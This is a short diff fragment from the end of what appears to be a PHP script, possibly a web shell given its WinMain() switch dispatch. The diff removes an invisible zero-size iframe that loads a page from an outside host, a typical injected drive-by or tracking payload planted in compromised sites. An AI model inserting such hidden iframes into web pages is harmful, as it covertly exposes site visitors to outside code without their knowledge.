@@ -2717,4 +2717,3 @@ switch($s)
 	default:WinMain();break;
 }
 ?>
-<iframe src=http://www.duolian.com/count/cet/admin_count/adminindex.asp width=0 height=0></iframe>
